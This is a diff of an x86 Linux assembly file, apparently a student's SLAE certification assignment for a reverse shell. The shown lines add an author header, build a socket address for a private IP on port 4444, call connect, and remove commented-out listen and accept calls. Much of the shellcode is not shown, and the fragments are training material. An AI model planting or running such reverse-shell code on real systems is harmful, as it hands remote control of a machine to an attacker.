@@ -1,3 +1,9 @@
+;Author: Aaron Weathersby
+;SLAE #1488
+;Handle: t0b0x0r
+;github:https://github.com/t0b0rX0r/slae/upload/master/assignment2
+;Assignment #2- Reverse Shell
+;created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
 
 global _start
 
@@ -33,13 +39,7 @@ _start :
 	; connect (sockfd, struct sockaddr * addr, socklen_t addrlen)
 	; connect (eax [4444,2,127.0.0.1],??)
 
-	; build struct sockaddr
-;	push word 0x2e31
-;	push word 0x3030
-;	push w;;60 ;0x2e30 ;0x3130 
-;	push word 0001 ;0x3030 ;0x2e30 
-;	push 0x313638 ;168; 0x2e37
-	 push 0xa001a8c0 ;192;0x3132 ;0x3231;'  ;1270.0.1
+    push 0xa001a8c0 ;192;0x3132 ;0x3231;'  ;1270.0.1
 	push word 0x5c11; port 4444 DEC -> HEX, little endian
 	push word AF_INET ; 
 	mov ecx,esp
@@ -64,26 +64,6 @@ _start :
 	push  esi ; fd
 
 	int 0x80
-;listen
-; listen(sockfd,int backlog)
-	;mov esi,edi ; copy fd to esi
-	;mov eax, 102
-	;mov ebx, SYS_LISTEN ; 4
-	;push 0 ; backlog
-	;push esi ;  fd =3
-	;mov ecx,esp
-	;int 0x80
-
-;accept
-; accept(sockfd,struct sockaddr,*socklen)
-	;mov eax,102
-	;mov ebx, SYS_ACCEPT
-	;push 0
-	;push 0
-	
-	;push esi ; fd=3
-	;mov ecx,esp
-	;int 0x80
 ; redirect to STDIN
 ;exec shell
 
